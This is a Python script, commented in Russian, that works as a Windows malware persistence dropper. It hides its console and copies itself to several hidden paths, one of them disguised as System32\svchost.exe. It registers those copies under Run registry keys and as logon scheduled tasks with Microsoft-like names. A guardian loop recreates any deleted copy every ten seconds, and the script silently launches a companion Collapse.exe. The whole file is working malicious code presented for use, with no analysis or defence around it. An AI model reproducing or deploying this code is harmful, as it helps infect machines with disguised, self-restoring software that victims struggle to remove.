import os
import sys
import shutil
import winreg as reg
import ctypes
import subprocess
import time
import threading

# Скрыть консоль
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Пути для копий (все скрытые)
USER = os.environ['USERNAME']
PATHS = [
    # Основное место
    r"C:\Windows\System32\svchost.exe",  # маскировка под системный
    # Скрытые копии
    os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Windows', 'Collapse.exe'),
    os.path.join(os.environ['TEMP'], 'Collapse.exe'),
    r"C:\ProgramData\Microsoft\Windows\Collapse.exe",
    os.path.join(os.environ['USERPROFILE'], 'Desktop', '.Collapse.exe'),
]

def hide_file(path):
    """Скрыть файл"""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 2)
    except:
        pass

def copy_itself():
    """Копирование себя во все места"""
    current = sys.argv[0]
    for path in PATHS:
        try:
            if not os.path.exists(path):
                os.makedirs(os.path.dirname(path), exist_ok=True)
                shutil.copy2(current, path)
                hide_file(path)
        except:
            pass

def add_all_to_startup():
    """Добавление всех копий в автозагрузку"""
    startup_names = ["WindowsCollapse", "SystemCollapse", "MicrosoftCollapse", "UpdateCollapse"]
    for name, path in zip(startup_names, PATHS[:len(startup_names)]):
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, name, 0, reg.REG_SZ, f'"{path}"')
            reg.CloseKey(key)
        except:
            pass
    
    # Добавление через планировщик задач
    for i, path in enumerate(PATHS[:3]):
        try:
            subprocess.run(f'schtasks /create /tn "MicrosoftUpdate{i}" /tr "{path}" /sc onlogon /f', 
                         shell=True, capture_output=True)
        except:
            pass

def guardian_loop():
    """Сторож: проверяет наличие всех копий и восстанавливает"""
    while True:
        time.sleep(10)  # проверка каждые 10 секунд
        
        # Проверяем основную копию
        main_path = PATHS[0]
        if not os.path.exists(main_path):
            # Восстанавливаем из любой другой копии
            for path in PATHS[1:]:
                if os.path.exists(path):
                    shutil.copy2(path, main_path)
                    hide_file(main_path)
                    break
        
        # Проверяем все остальные копии
        for path in PATHS[1:]:
            if not os.path.exists(path):
                # Восстанавливаем из основной
                if os.path.exists(main_path):
                    shutil.copy2(main_path, path)
                    hide_file(path)

def run_collapse():
    """Запуск Collapse.exe если он существует"""
    collapse_path = os.path.join(os.path.dirname(sys.argv[0]), "Collapse.exe")
    if os.path.exists(collapse_path):
        subprocess.Popen([collapse_path], creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        # Ищем в других местах
        for path in PATHS:
            collapse_path = path.replace('svchost.exe', 'Collapse.exe')
            if os.path.exists(collapse_path):
                subprocess.Popen([collapse_path], creationflags=subprocess.CREATE_NO_WINDOW)
                break

if __name__ == "__main__":
    # Копируем себя везде
    copy_itself()
    
    # Добавляем в автозагрузку
    add_all_to_startup()
    
    # Запускаем сторожа
    threading.Thread(target=guardian_loop, daemon=True).start()
    
    # Запускаем Collapse.exe
    run_collapse()
    
    # Бесконечный сон
    while True:
        time.sleep(60)